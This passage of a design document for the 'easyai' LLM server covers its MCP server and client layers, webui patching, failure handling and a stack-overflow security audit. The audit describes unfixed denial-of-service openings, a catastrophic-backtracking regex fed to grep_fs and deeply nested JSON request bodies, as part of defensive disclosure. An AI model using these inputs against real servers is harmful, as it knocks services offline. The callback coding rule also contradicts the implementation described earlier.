We trap `SIGINT` and `SIGTERM`, the handler calls `httplib::Server::stop()`
which causes `listen()` to return; main() returns 0. No threads, no engine
calls happen in the signal handler — only `Server::stop()` is signal-safe-ish
under cpp-httplib.

## 6c. MCP server protocol layer

Lives in `src/mcp.cpp` + `include/easyai/mcp.hpp`. User-facing
documentation: [`MCP.md`](MCP.md) (protocol surface + per-client
cookbook), [`easyai-mcp-server.md`](easyai-mcp-server.md) (the
standalone MCP-only binary). This section describes *why* the
server exposes itself as an MCP provider.

> **The dispatcher (`easyai::mcp::handle_request`) is a pure function
> over `tools` and a request body string.** Two binaries call it:
> `easyai-server` (where `/mcp` is one of many endpoints alongside
> `/v1/chat/completions` and the webui) and `easyai-mcp-server` (a
> dedicated daemon with no engine). The pure-function shape is what
> makes the second binary cheap to ship — no engine integration, no
> chat-template hooks, no shared global state with the dispatcher.

### What's the protocol payoff

The agent loop has two consumers of the tool catalogue:
1. The local model running inside easyai-server's `easyai::Engine`.
2. Remote AI applications (Claude Desktop, Cursor, Continue,
   OpenWebUI, custom clients) over MCP.

Both consume the SAME `ctx->default_tools` vector. The work that
went into wiring `Toolbelt` + the knowledge tools + external-tools is
reused verbatim — no second serialiser, no second registry, no second
auth surface. Adding a new tool means one C++ change (or one
manifest file) and every consumer sees it on next restart.

### Layered position

```
   ┌────────────────────────────────────────────────────────────┐
   │                       MCP CLIENTS                           │
   │  Claude Desktop (via stdio bridge) / Cursor / Continue /   │
   │              OpenWebUI / custom JSON-RPC SDKs               │
   └────────────────────────────────────────────────────────────┘
                                │
                       JSON-RPC 2.0 / HTTP
                                ▼
   ┌────────────────────────────────────────────────────────────┐
   │  easyai-server   POST /mcp                                  │
   │                                                              │
   │   route_mcp(req) → easyai::mcp::handle_request(             │
   │                       body, ctx->default_tools, info) →     │
   │                       JSON-RPC response body                 │
   └────────────────────────────────────────────────────────────┘
                                │
                                ▼
   ┌────────────────────────────────────────────────────────────┐
   │  src/mcp.cpp  (pure function — no global state)             │
   │                                                              │
   │     parse JSON-RPC envelope                                  │
   │     route by method:                                         │
   │       initialize       → return ServerInfo + capabilities    │
   │       tools/list       → enumerate Tool descriptors          │
   │       tools/call       → look up by name → handler(call) →   │
   │                          map ToolResult → MCP content shape  │
   │       ping             → empty result                        │
   │     return JSON-RPC response (or error envelope)             │
   └────────────────────────────────────────────────────────────┘
                                │
                                ▼
                  ctx->default_tools (read-only)
                  same vector the local engine uses
```

### Why stateless request/response (and not SSE)

The MCP spec describes a "streamable HTTP" transport where the
server can push notifications back via SSE. That matters when:

- The tool list can change at runtime (server fires
  `notifications/tools/list_changed`).
- A long tool call wants to emit progress (`notifications/progress`).

We have neither today. The tool catalogue is fixed at startup.
Tool calls are short, synchronous, and capped by their own
timeouts. So we ship the simpler half of the spec — POST request,
JSON response, no session state — and reserve `GET /mcp` for the
SSE notification stream a future PR will add.

### Listen-socket timeouts (`--http-timeout`)

cpp-httplib's `set_read_timeout` / `set_write_timeout` apply to
EVERY request the server accepts, including `/v1/chat/completions`
SSE streams and `/mcp` JSON-RPC calls.  Default **600 s** (10 min)
is set high deliberately: a thinking-heavy model can hold an SSE
stream open for many minutes between visible tokens while emitting
only `delta.reasoning_content`.  At llama-server's traditional 60 s
the connection drops mid-thought and the client sees
`HTTP request failed: Failed to read connection`.

The cap is operator-tunable via `--http-timeout SECONDS`
(`[SERVER] http_timeout` in the INI), and the chosen value is
echoed in the startup banner alongside `http_retries=N` so the
operator sees it in journalctl without `--verbose`.  HTTP 408 / 504
responses (cpp-httplib's timeout status) and any uncaught exception
go through `set_error_handler` / `set_exception_handler` and log
unconditionally — `[easyai-server] WARN HTTP 408 timeout on POST
/v1/chat/completions from 10.0.0.1:54321 (check --http-timeout, …)`.

### Why `--external-tools` shows up here

Operator-defined external tools (the `EASYAI-*.tools` manifests
from `EXTERNAL_TOOLS.md`) are added to `ctx->default_tools` at
startup just like built-ins. They become MCP tools automatically,
with the same `inputSchema` declared in the manifest. An operator
who declares `git_log` in `EASYAI-internal.tools` exposes it
simultaneously to:

- The local model (which calls `search_knowledge` and dispatches).
- Cursor's chat (via MCP `tools/call`).
- Claude Desktop (via the stdio bridge).

This is the layering payoff in practice: one manifest, three
consumers.

### Compatibility shims (`/v1/models`, `/api/tags`)

Adjacent to MCP we also implement two list-models endpoints so
clients that don't yet speak MCP can still discover the loaded
model:

- **OpenAI**: `/v1/models` (already existed for `/v1/chat/completions`
  consumers — Continue, LangChain, LiteLLM, every OpenAI SDK).
- **Ollama**: `/api/tags` + `/api/show` (LobeChat, OpenWebUI in
  Ollama mode, Continue's Ollama provider).

These don't expose tools — they only expose the loaded model
metadata. Clients that want tools either upgrade to MCP or use
the OpenAI-compat `/v1/chat/completions` endpoint, which already
forwards tools via the OpenAI tools/tool_calls format.

`/health` includes a `compat` block so a client can sniff which
APIs are live without round-tripping each.

## 6d. MCP client

Lives in `src/mcp_client.cpp` + `include/easyai/mcp_client.hpp`.
User-facing documentation: [`MCP.md`](MCP.md) §9.5. This section
describes the architectural shape.

> **`easyai::mcp::fetch_remote_tools(opts)` is a pure factory: it
> takes a URL + token + timeout and returns `std::vector<Tool>`.**
> Each emitted Tool's handler proxies `tools/call` to the same
> upstream over libcurl. There's no class to instantiate, no
> connection pool to wire — the connection state is captured in a
> `shared_ptr<Conn>` held by the Tool handler closures, so the
> connection lives exactly as long as any returned Tool is reachable.

### Why libcurl

cpp-httplib (the static lib we use elsewhere) requires us to thread
OpenSSL into anything that wants HTTPS. libcurl is already the
transport for `fetch_web` / `search_web`, and it brings TLS in for
free at the system level. The MCP client gets HTTPS for free without
adding a second crypto stack to libeasyai.

### Handshake + lifecycle

`fetch_remote_tools` is one-shot at startup:

1. POST `initialize` — claim `protocolVersion 2024-11-05`. We don't
   strictly check the server's response beyond shape; any sane peer
   accepts our handshake.
2. POST `notifications/initialized` (notification, no response
   expected). Best-effort; servers that 204 / 200-empty-body are
   fine.
3. POST `tools/list` — enumerate the upstream's catalogue.

For each remote tool, we build a `Tool` whose `handler` posts
`tools/call` to the same `/mcp` endpoint when invoked. The
`inputSchema` field from `tools/list` becomes the local Tool's
`parameters_json` verbatim — no translation, no normalisation.

### Lock granularity

The libcurl easy handle is not reentrant. A single `std::mutex` in
`Conn` guards every HTTP exchange. Held only across one perform()
call, so concurrent agents hitting different remote tools serialise
the wire-side work but not the dispatcher logic. For higher
throughput we'd switch to a per-call easy handle pool; current usage
patterns (a few tools/call per turn from one model) don't need it.

### Failure modes

* **Network down at startup** → `fetch_remote_tools` exhausts the
  retry budget (default 5 extra attempts, exponential backoff up to
  4 s), returns empty + err; the caller logs and continues. Server
  still starts.
* **Auth rejected at startup** (HTTP 401/403/4xx) → not retried;
  same fall-through. 4xx is treated as a contract failure.
* **Mid-session call failure** (transient curl error or 5xx)
  → retried up to `ClientOptions::retries` times with the same
  backoff; each retry logs `[easyai-mcp] URL attempt N/M failed
  (REASON); retrying in Bms`.  4xx and malformed JSON skip the
  retry loop and surface immediately as `ToolResult::error`.
* **Retry budget exhausted** → handler returns `ToolResult::error`
  with the final curl/HTTP message; the agent loop sees a normal
  tool error and reacts (typical model behaviour: try once more
  through the model, then narrate the failure to the user).
* **Name collision with a local tool** → the tool wiring code in
  the consumer (e.g. `examples/server.cpp`) skips the remote dup and
  logs at startup. Local tools always win.

### Retry semantics (`ClientOptions::retries`, default 5)

Symmetric with the libeasyai-cli retry layer (§5b) but on libcurl:

| Condition                                       | Retry? |
|-------------------------------------------------|--------|
| `CURLE_OK` && HTTP 2xx                          | (success — exit loop) |
| HTTP 4xx                                        | **No** |
| HTTP 5xx                                        | Yes |
| `CURLE_COULDNT_CONNECT` / `CURLE_COULDNT_RESOLVE_*` | Yes |
| `CURLE_OPERATION_TIMEDOUT`                      | Yes |
| `CURLE_RECV_ERROR` / `CURLE_SEND_ERROR`         | Yes |
| `CURLE_GOT_NOTHING` / `CURLE_PARTIAL_FILE`      | Yes |
| Other curl errors (bad URL, SSL cert, etc.)     | **No** (permanent) |

The response buffer is reset at the top of each attempt so a
partial body from a failed try doesn't leak into the next.  Because
`http_post_json` reads the whole response before returning (no
streaming), the "never retry mid-stream" rule from libeasyai-cli
doesn't apply here — every retry is safe by construction.

`opts.retries` is wired into `examples/server.cpp` from the new
`--http-retries` flag (default 5), so the server's MCP-client side
inherits the same retry budget that the operator picks for the
listen socket.

The `Conn` handle and the libcurl resource get cleaned up when the
last `Tool` referencing them goes out of scope, which is process
shutdown for the typical server use case.

---

## 7. The webui

The webui shipped is the compiled SvelteKit bundle from `llama-server`,
embedded into the easyai-server binary at build time via
`cmake/xxd.cmake` (one `.hpp` per asset, generated from
`webui/{index.html,bundle.js,bundle.css,loading.html}`).  Total binary
size goes from ~1.5 MB to ~8.3 MB; in exchange we get a polished chat
UI with markdown rendering, code highlighting, preset switching, file
attachments, and per-message stats — all without us maintaining any
of it.

### Customisations: two layers

1. **Build-time string substitution on `bundle.js`** — at server
   startup we patch a few hard-coded llama.cpp brand strings:
   * `>llama.cpp</h1>` → `>{title}</h1>` (sidebar + welcome brand)
   * `llama.cpp - AI Chat Interface` → `{title}` (page title)
   * `Initializing connection to llama.cpp server...` → `... {title} server …`
   * `} - llama.cpp` → `} - {title}` (per-conversation page title)
   * `Type a message...` placeholder, replaced via `--webui-placeholder`

2. **Runtime DOM injection** into the served `index.html`'s `<head>`
   via several `<script>` IIFE blocks:
   * **Title pin** via `Object.defineProperty(document, 'title', {set:})`.
   * **LocalStorage seeding** to disable MCP defaults and force
     `keepStatsVisible=true` / `showMessageStats=true`.
   * **DOM scrubber** — a `MutationObserver` on `<body>` matches
     visible-text NEEDLES (`/^MCP\b/`, `/^Sign in/`, `/Load model/`,
     etc.) and hides their containing card / list-item / dialog so
     unsupported chrome doesn't reach the user.
   * **`fetch` interceptor** that 501s `/authorize`, `/token`,
     `/register`, `/.well-known/*`, `/models/load`, `/cors-proxy`,
     `/dev/poll`, `/home/web_user/*`; stubs `/properties` with `{}`;
     and tees the SSE response of `/v1/chat/completions` into a
     status-pill state machine.
   * **Tone chip + metrics bar** in a Shadow-DOM host
     (`__easyaiBarHost`) attached to `<html>` (so it survives Svelte
     body re-renders) — selector for
     `deterministic / precise / balanced / creative` plus
     `ctx X/Y · last N tok · s · t/s` overview.
   * **Per-message status pill** appended to each assistant action
     toolbar — shows `thinking` / `answering` / `fetching · <tool>` /
     `complete · 98 tok · 4.4s · 22.3 t/s`.
   * **Reasoning-panel shrink** — another `MutationObserver` finds
     `<details>` whose summary text matches `/^Reasoning/i`, applies
     a smaller monospace gray style so the trace doesn't dominate
     the bubble, defaults `open=true` during streaming, and
     auto-collapses on `finish_reason`.
   * **Legacy custom thinking panel** (`__easyai-thinking`) ships
     dormant behind `window.__easyaiCustomThink = false`.  Kept for
     re-enabling on demand if the bundle's native panel ever
     regresses.

### Why the bundle approach

* Zero install footprint — operators get a single `easyai-server`
  binary, no `--www-dir` to remember.
* Existing llama-server users feel at home immediately.
* Markdown, syntax highlighting, multi-attachment chat, etc. are
  hard problems we don't need to solve.

The cost is that the bundle hashes class names on every rebuild, so
*all* customisations must use `aria-label`, `data-testid`, or
visible-text matching.  Never rely on `[class*=…]`.

---

## 8. Memory & failure model

### Resource ownership

| resource                      | owned by                                | freed when                             |
|-------------------------------|-----------------------------------------|----------------------------------------|
| `llama_model`, `llama_context`| `common_init_result_ptr` (unique_ptr)   | `Engine::Impl` dtor                    |
| `common_chat_templates`       | `common_chat_templates_ptr` (unique_ptr)| `Engine::Impl` dtor                    |
| `common_sampler`              | raw pointer + manual free               | `Engine::Impl` dtor                    |
| `Engine::Impl`                | `unique_ptr<Impl>`                      | `Engine` dtor                          |
| HTTP server                   | `httplib::Server` (stack)               | `main()` return                        |
| `ServerCtx`                   | `unique_ptr<ServerCtx>`                 | `main()` return                        |
| Per-request strings/JSON      | stack / `nlohmann::json`                | end of handler                         |

### Failure modes & responses

| failure                                  | response                                                                                         |
|------------------------------------------|---------------------------------------------------------------------------------------------------|
| Malformed JSON request                   | 400 + OpenAI error envelope                                                                       |
| `messages` missing / empty               | 400 + descriptive error                                                                           |
| Engine throws during generation          | 500 + error envelope; engine remains usable                                                       |
| Chat-template parser throws (model bug)  | Caught in `parse_assistant`; raw text returned as content; finish_reason="stop"                   |
| Tool handler throws                      | Caught in chat loop; result becomes `ToolResult::error("tool threw: …")`; agent continues         |
| Unknown tool called by model             | `ToolResult::error("unknown tool: …")` injected; agent continues                                  |
| Context overflow during decode           | Engine sets `last_error`, returns partial output; subsequent calls require `clear_history`        |
| Request body > `--max-body`              | httplib aborts the request before we see it                                                       |
| `SIGINT` mid-generation                  | CLI: single Ctrl-C stops generation and returns to prompt; triple rapid force-exits. Server: stop() then orderly exit |

---

## 9. What changes when llama.cpp updates?

Most changes are absorbed automatically because we use `add_subdirectory()`.
Things to watch:

* **Sampler API churn** — we use `common_sampler_init / sample / accept`. If
  fields move under `common_params_sampling`, `set_sampling()` may need a
  patch.
* **Chat-template format** — new `common_chat_format` enum values can land
  any time. Unknown formats fall back through our `parse_assistant` try/catch
  and the assistant text is returned as plain content.
* **`common_init_from_params`** — its signature is stable across recent
  releases; if it grows, we mirror via the same setter→params plumbing.

The recommended workflow is to pin both `easyai/` and `llama.cpp/` as
git submodules in your application repo so an upgrade is a single commit.

---

## 10. Stack-overflow audit

> **Why this exists.** On 2026-04-26 the production AI box crashed
> three times with `SIGSEGV` while the model was reasoning about news
> queries.  `coredumpctl gdb` showed **94 766 stack frames** — an
> infinite recursion in libstdc++'s regex engine triggered by
> `easyai::tools::strip_html` running over an HTML page returned by
> `fetch_web`.  After fixing that one site we walked the rest of the
> tree the same way: every place where adversarial input could meet
> a recursive helper.  This chapter is the report.

The audit is **static** — pattern matching + manual call-graph reading,
no fuzzing.  It covers everything we link or build, including the
libcurl-driven internet calls, the LLM-driven tool inputs, and the
HTTP request parsers.  The boundaries we did **not** cross are noted
explicitly under "Out of scope" below.

### 10.1  Methodology

For each suspect category we ran a targeted scan:

| Category                       | How we scanned                                                                        |
|--------------------------------|---------------------------------------------------------------------------------------|
| `std::regex` usage             | `grep -nE 'std::regex\|regex_(replace\|search\|match)\|sregex_iterator' src/ examples/`|
| Direct & mutual recursion      | Python AST-ish walker: for each function definition, search its body for its own name; manually validate each hit |
| Stack-allocated big buffers    | `grep -nE '\b(char\|int\|float\|...)\s+[a-z_]+\s*\[[0-9]+\]'`; sort by declared size  |
| `alloca` / VLAs                | `grep -nE 'alloca\|__builtin_alloca'` + manual scan for VLA `T name[expr]` patterns   |
| Internet ingress               | manual reading of `http_get`, `http_post_form`, libcurl callbacks; libcurl options grep |
| LLM-controlled regexes / globs | search for `args::get_string(..., "pattern", ...)` and `args::get_string(..., "...glob...", ...)` |
| HTTP request body parsing      | every `json::parse(req.body)` site cross-checked against `set_payload_max_length`     |
| Per-token hot paths            | call-graph from cpp-httplib worker → `chat_continue` → `generate_until_done` → `on_token` → llama.cpp common |

### 10.2  Confirmed safe

The following code paths are **stack-safe** under any input:

* **No `alloca`, no VLAs, no large stack arrays anywhere.**  The
  largest stack-allocated buffer in `src/` and `examples/` is
  `char buf[16]` (in `strip_html`'s replacement and in the recipes
  example's `today_is`).  All other buffers are 3–8 bytes.
* **`Engine::Impl::generate_until_done`** is a flat `while`-loop with
  manual `n_past` counter — no recursion, no large stack frame.
* **`Engine::chat_continue`** is a `for`-loop with an explicit hop
  cap (`kMaxToolHops = 8`) and a thought-only retry budget
  (`kMaxThoughtRetries = 2`).  Bounded depth.
* **`Engine::recover_qwen_tool_calls` + `walk_balanced_braces` +
  `strip_tool_call_blocks`** in `src/engine.cpp:49–136` are pure
  `find()`-based scanners — no recursion, no regex.
* **`args::find_key` + `read_json_string` + the four `get_*` and
  `get_*_or` helpers** in `src/tool.cpp` are forward-only iterators
  over a flat key-value scan.  Confirmed iterative.
* **`strip_html`** in `src/builtin_tools.cpp:33–143` (this audit's
  precipitating bug) was rewritten as a forward-only character
  scanner.  O(n) without recursion regardless of input size or
  shape.  Replaces three `std::regex_replace` calls.
* **HTTP request entry depth.**  The deepest call chain we measured
  from `httplib::ThreadPool::worker` to a leaf in `chat_continue`
  is **~13 frames**.  With the default 8 MiB pthread stack and the
  ~200 byte average frame size, we have an effective ceiling of
  ~40 000 frames — three orders of magnitude headroom.

### 10.3  Eliminated this round

| Site                                              | Risk                                         | Fix                                                                                  |
|---------------------------------------------------|----------------------------------------------|--------------------------------------------------------------------------------------|
| `src/builtin_tools.cpp::strip_html` (old)         | `std::regex_replace` with `[\s\S]*?` and a back-reference; libstdc++ recursive engine blew the stack on real-world HTML pages fetched by `fetch_web` (94 766 frames in the production coredump) | Rewrote as forward-only scanner.  Inline `<script>`/`<style>` block skip via `starts_with_ci` probes; no regex, no recursion. |
| `examples/server.cpp::on_token` lambda            | `common_chat_msg_diff::compute_diffs` throws `"Invalid diff: now finding less tool calls!"` when partial-parse temporarily extracts then unextracts a tool_call — the exception unwound through the engine and tore down the request | Wrapped `compute_diffs` in `try/catch`, hold `prev_msg` on the last good state and wait for the next token to settle |
| `examples/server.cpp::handle_chat_stream` final pass | When every partial parse threw (malformed Qwen tool_call markup) the loop emitted zero content deltas and the user saw an empty bubble | Capture `engine_final_content = chat_continue()`; emit a synthesised content delta if `any_content_emitted == false` |

### 10.4  Open risks — HIGH

#### 10.4.1  `grep_fs` accepts an LLM-supplied regex

**Site:** `src/builtin_tools.cpp:685–688`.

```cpp
std::regex::flag_type rf = std::regex::ECMAScript;
if (ci) rf |= std::regex::icase;
std::regex rx;
try { rx = std::regex(pattern, rf); }    // ← pattern from the model
catch (const std::regex_error & e) { ... }
```

Then `std::regex_search(line, rx)` is called per file line.  The
model can put **any** ECMAScript pattern into `pattern` and the
filesystem the tool walks contains content the model may also
control (when the operator runs the agent against a workspace).
Patterns like `(a+)+$` against `"aaaaaa…b"` cause classical
catastrophic backtracking → stack overflow → SIGSEGV — the same
class of bug as the `strip_html` incident.

**Why we haven't fixed yet:** ripping `std::regex` out of `grep_fs`
means re-implementing meaningful subset of regex (alternation,
quantifiers, character classes) by hand, or pulling in a non-
backtracking engine (RE2, Hyperscan).  Tracked as work.

**Interim mitigation options:**
* Reject patterns longer than N chars (cheap, catches most known
  bombs but not all).
* Run `regex_search` in a worker thread with a hard timeout.
* Switch the tool's grammar to **glob-only** (no regex), like
  `glob_fs`.  The agent loses substring-regex power but gains
  bounded execution time.
* Pull in Google's RE2 (no backtracking, linear time, separate
  compile-time dep).  This is the right long-term answer.

Until one of those lands, **`grep_fs` is unsafe in adversarial
multi-tenant deployments**.  In single-user mode it's still
practical because the operator chose to run it.

#### 10.4.2  `nlohmann::json::parse` on the HTTP request body

**Sites:**
* `examples/server.cpp:1419`  — `json::parse(req.body)` for `/v1/chat/completions`
* `examples/server.cpp:1973`  — `json::parse(req.body)` for `/v1/preset`
* `examples/cli.cpp:436, 580`  — JSON parsing of upstream SSE events

`nlohmann::json` builds its DOM via recursive descent on arrays and
objects.  An attacker who can post to the server can fit roughly
1.3 million levels of `{"a":` into the default 8 MiB body cap,
producing roughly 1.3M frames at parse time — well past the 8 MiB
default thread stack.

**Why this isn't surfacing in production:** typical OpenAI clients
produce shallow JSON, and our `--api-key` Bearer auth gates the
chat endpoint when set.  An attacker would need a valid bearer
token to land the bomb.  Operators running with `--api-key` and a
non-public Tailscale / VPN front are unaffected.  Public,
unauthenticated deployments are at risk.

**Mitigations available right now:**
* Drop `--max-body` to 1 MiB by default in the systemd unit (still
  fits any reasonable conversation; cuts the depth ceiling by ~8x).
* Add a SAX-callback wrapper that counts depth and aborts at e.g.
  256.  `nlohmann::json::sax_parse` makes this trivial.

The second is the right answer.  Open as work.

### 10.5  Open risks — MEDIUM

#### 10.5.1  `search_web` HTML regex still uses `[\s\S]*?`

**Site:** `src/builtin_tools.cpp:435–462`.

```cpp
static const std::regex re_title(
    R"DDG(<a[^>]*class\s*=\s*"[^"]*result__a[^"]*"[^>]*href\s*=\s*"([^"]+)"[^>]*>([\s\S]*?)</a>)DDG", ...);
static const std::regex re_snippet(
    R"DDG(<(?:a|div)[^>]*class\s*=\s*"[^"]*result__snippet[^"]*"[^>]*>([\s\S]*?)</(?:a|div)>)DDG", ...);
```

These run on the response body of `html.duckduckgo.com`.  DuckDuckGo
is not adversarial today, but **a successful DNS hijack or MITM
proxy of `duckduckgo.com` would feed `std::regex_iterator` into the
same engine that crashed `strip_html`**.  The `[\s\S]*?` lazy is
constrained between specific anchors (`</a>`, `</div>`), so the
backtracking surface is much smaller than `strip_html`'s was — but
it is non-zero.

**Plan:** rewrite as a forward-only scanner mirroring the new
`strip_html`.  Same approach, ~50 lines.  Not yet done because the
risk is purely supply-chain — we'd need DNS or TLS to be
compromised first.

#### 10.5.2  libcurl write callbacks — in-flight cap (RESOLVED)

**Sites:** `src/builtin_tools.cpp::curl_write_cb`, used by
`http_get` and `http_post_form`.

The current callback wraps a `HttpSink { body, max_bytes, truncated }`
struct and stops appending the moment the body would exceed
`max_bytes`:

```cpp
static size_t curl_write_cb(void * buf, size_t sz, size_t n, void * ud) {
    auto * sink = static_cast<HttpSink *>(ud);
    const size_t incoming = sz * n;
    if (sink->body->size() >= sink->max_bytes) {
        sink->truncated = true;
        return incoming;          // accept-but-discard, no buffer growth
    }
    const size_t room = sink->max_bytes - sink->body->size();
    const size_t take = (incoming <= room) ? incoming : room;
    sink->body->append(static_cast<char *>(buf), take);
    if (take < incoming) sink->truncated = true;
    return incoming;
}
```

We chose accept-and-discard (return `incoming`) over abort-the-transfer
(return `0`) deliberately — the latter surfaces as `CURLE_WRITE_ERROR`
which the retry layer would interpret as a transient failure and
retry, just to hit the same cap again.  Accept-and-discard caps RAM
exactly while letting curl drain the connection cleanly.  The
`truncated` flag is available to callers that want to surface "the
result was capped" in the model-facing tool result.

(Bounded already: `CURLOPT_TIMEOUT=20s`, `CURLOPT_MAXREDIRS=5`,
`CURLOPT_NOSIGNAL=1` — these prevent infinite-redirect loops and
SIGALRM races.  ✓)

### 10.6  Open risks — LOW (accepted)

#### 10.6.1  llama.cpp common library uses `std::regex`

| File                                       | Per-request? | Pattern shape risk                  |
|--------------------------------------------|--------------|-------------------------------------|
| `common/arg.cpp` (4)                       | init only    | n/a (CLI args)                      |
| `common/common.cpp` (2)                    | init only    | n/a (log setup)                     |
| `common/json-schema-to-grammar.cpp` (9)    | per request, when client passes `tools` | inputs are JSON-Schema; structurally bounded |
| `common/json-partial.cpp` (3)              | **per token** | inputs are model output, but patterns are character-class shaped (low backtracking) |
| `common/regex-partial.cpp` (7)             | **per token** | bespoke partial-regex helper; reviewed by upstream |

We rely on upstream not producing the same kind of bug we just
fixed.  If it ever happens, we'll see it in the same way (94 000-
frame coredump in `_M_dfs`) and report upstream.  Worth keeping
`coredumpctl` configured (which the installer now does).

#### 10.6.2  PEG parser depth in `common/chat.cpp`

The chat-template grammar is generated by llama.cpp's
`json-schema-to-grammar.cpp` from the model's tool definitions.
Grammar depth is bounded by the schema depth; for the seven builtin
tools the schemas are flat (max depth 2 — properties → items).  No
risk.

#### 10.6.3  Webui DOM helpers (JavaScript)

`renderSidebar` (in the embedded webui assets, not the bundle)
tail-recurses through itself only after a delete.  The browser's V8
engine has its own stack cap and would throw `RangeError` long
before exhausting host memory.  Not a binary risk.

### 10.7  Out of scope

* **Vulkan/CUDA/ROCm shader code** running in the GPU process — own
  stack discipline, not ours.
* **Jinja chat-template engine** inside `common_chat_templates_apply`
  — third-party code; if a template recurses into itself, it fails
  closed via the existing `try/catch` in `Engine::Impl::render`.
* **GGUF tensor loading** — happens once at startup, not on the
  request path.

### 10.8  Coding rules going forward

To stop this class of bug ever reaching production again, the
following rules apply to all easyai source from this point on:

1. **Never use `std::regex` on input that originates outside the
   process.**  This includes: the model's output, HTTP request
   bodies, file contents, environment variables that look
   user-supplied, anything from libcurl.
   *Permitted:* `std::regex` on **constants** or on inputs whose
   size and shape are statically bounded by us (e.g. a fixed-format
   key from the chat-template arena).
   *Required alternative for hostile input:* forward-only scanner
   (the new `strip_html` is the canonical reference), or RE2 if a
   real regex flavour is needed.

2. **Every libcurl write callback enforces its own max_bytes** by
   returning `0` once the buffer would exceed the cap.  The
   post-transfer `body.resize()` is a backstop, not the primary
   cap.

3. **Every parser of LLM-emitted text is forward-only** (no
   recursion, no backtracking).  The two current parsers
   (`recover_qwen_tool_calls`, `walk_balanced_braces`) follow this
   rule; new ones must too.

4. **Every accepted-from-network JSON enforces a depth limit.**
   Use `nlohmann::json::sax_parse` with a depth-counting handler
   that bounds at 256 and rejects deeper input with a `400`.

5. **Tools that accept a `pattern` parameter from the model do not
   compile it through `std::regex`.**  Either use glob-only
   matching or RE2.

6. **Hop counters are mandatory in every loop that re-enters the
   model.**  `chat_continue`'s `kMaxToolHops` and
   `kMaxThoughtRetries` are the model.  No new loop should be
   open-ended.

7. **`coredumpctl` and `LimitCORE=infinity` stay in the unit.**
   They are the only thing that turned the strip_html SIGSEGV from
   "the box just resets" into "we have a 94 000-frame stack to read."

### 10.9  Open work tracked from this audit

| Priority | Item                                                                                  |
|----------|---------------------------------------------------------------------------------------|
| HIGH     | Replace `std::regex` in `grep_fs` with RE2 or restrict to glob-only matching         |
| HIGH     | Add SAX-based depth-bounded parser for HTTP `req.body` JSON                          |
| MEDIUM   | Rewrite `search_web`'s DDG result extraction as a forward-only scanner               |
| LOW      | Add a fuzz harness against `strip_html` and `recover_qwen_tool_calls` (libfuzzer)    |
| LOW      | Investigate switching to RE2 or a non-backtracking engine repo-wide                  |
